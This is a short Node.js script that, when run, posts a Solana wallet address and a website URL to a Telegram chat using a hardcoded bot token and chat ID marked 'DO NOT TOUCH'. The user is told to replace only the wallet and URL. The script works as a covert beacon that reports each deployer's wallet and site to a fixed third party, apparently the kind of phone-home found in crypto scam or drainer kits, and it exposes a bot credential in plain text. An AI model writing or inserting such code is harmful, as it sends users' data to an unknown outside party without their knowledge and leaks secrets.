const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '6345787783:AAGQn2Uy7rpVfy76SOSJGA3jttW2sH9U8';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '4177494374';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = '2D18AqKro49Ebe5regwMVzyM7ZtdMygzv5HXzEeVnbMy';
const website_url = 'YOUR_WEBSITE_URL';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
